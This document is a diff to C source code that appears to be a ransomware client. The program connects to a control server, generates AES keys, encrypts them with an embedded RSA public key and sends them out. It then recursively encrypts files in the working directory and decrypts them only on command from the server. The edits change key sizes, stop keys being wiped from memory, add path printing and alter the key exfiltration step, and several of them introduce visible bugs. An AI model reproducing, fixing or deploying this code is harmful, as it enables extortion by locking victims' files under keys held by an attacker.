@@ -12,7 +12,6 @@
 #include <openssl/evp.h>
 #include <openssl/bio.h>
 #include <openssl/err.h>
-#include <string.h>
 
 char publicKey[] = "-----BEGIN PUBLIC KEY-----\n"\
 "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuaSs3J+sdyTWIGiYOuWe\n"\
@@ -23,9 +22,7 @@ char publicKey[] = "-----BEGIN PUBLIC KEY-----\n"\
 "xqd8R5PZRhudSQGNg6UrhmlsmS1OUdmB+/9eOHVGeLeIZHNcHyc9n5OQ+W7CpZ0p\n"\
 "+wIDAQAB\n"\
 "-----END PUBLIC KEY-----\n";
-
 int padding = RSA_PKCS1_PADDING;
-
 
 
 void handleError(int sockid);
@@ -44,6 +41,9 @@ int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr);
 
 int main (int argc, char * argv[])
 {
+
+
+    
     int sockid;
     int server_port = 8888;
     char *server_ip = "10.0.0.2";
@@ -116,30 +116,29 @@ int main (int argc, char * argv[])
             char cwd[1048];
             getcwd(cwd, 1024);
 
-            unsigned char key[33];
-            int sizeKey = 33;
-            unsigned char iv[33];
-            int sizeIv = 33;
+            unsigned char key[32];
+            int sizeKey = 32;
+            unsigned char iv[16];
+            int sizeIv = 16;
             char pKey[65];
-            char pIv[65];
+            char pIv[33];
 	        int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
 
             send_key(pKey, pIv, sockid, server_addr);
+
             listdir((const char *)cwd, iv, key, 'e');
-            memset(key, 0, 33);
-            memset(iv, 0, 33);
-            memset(pKey, 0, 65);
-            memset(pIv, 0, 65);
         }
         else if (strncmp(command, "dec",3)==0)
         {
             char cwd[1048];
             getcwd(cwd, 1024);
-            unsigned char key[33];
+            unsigned char key[32];
             int size;
-            unsigned char iv[33];
+            int sizeKey = 32;
+            unsigned char iv[16];
+            int sizeIv = 16;
             char pKey[65];
-            char pIv[65];
+            char pIv[33];
             const char * separator = " ";
 
             char * strToken = strtok(command, separator);
@@ -147,24 +146,19 @@ int main (int argc, char * argv[])
             strcpy(pKey, strToken);
             strToken = strtok(NULL, separator);
             strcpy(pIv, strToken);
-            size = strlen(pIv);
-           
-            pIv[size-1] = '\0';  //removing \n from the iv
-            hexa_to_bytes(pKey, key,33);
-            hexa_to_bytes(pIv, iv,33);
+            size = strlen(iv);
+            iv[size-1] = '\0';  //removing \n from the iv
+            hexa_to_bytes(pKey, key,sizeKey);
+            hexa_to_bytes(pIv, iv,sizeKey);
             char response[2048];
             strcpy(response, cwd);
             strcat(response, " ");
             strcat(response, "Decrypted\n");
 
-           
 
             listdir((const char *)cwd, (unsigned char *)iv, (unsigned char *)key, 'd');
             send(sockid, (const char *)response, strlen(response)+1,0);
-            memset(key, 0, 33);
-            memset(iv, 0, 33);
-            memset(pKey, 0, 65);
-            memset(pIv, 0, 65);
+    
 
 
 
@@ -250,7 +244,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
             strcpy(filePath,name);
             strncat(filePath,"/",2);
             strncat(filePath,dirp->d_name,strlen(dirp->d_name));
-            
+            printf("%s\n",filePath);
             if (de_flag == 'e' && is_encrypted(filePath) == 0)
             {
                 encrypt(key, iv, filePath);
@@ -279,9 +273,8 @@ int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr)
     strcpy(msg, pKey);
     strcat(msg,":");
     strcat(msg,pIv);
-
-    public_encrypt(msg, strlen(msg), publicKey, encrypted);
-    send(sockid, (const char *)encrypted, 257,0);
+    int lenght = public_encrypt((unsigned char*)msg, strlen(msg), publicKey, encrypted);
+    send(sockid, (const char *)encrypted, strlen(encrypted)+1,0);
     free(msg);
 }
 
@@ -332,3 +325,7 @@ RSA * createRSA(unsigned char * key,int public)
  
     return rsa;
 }
+
+
+
+
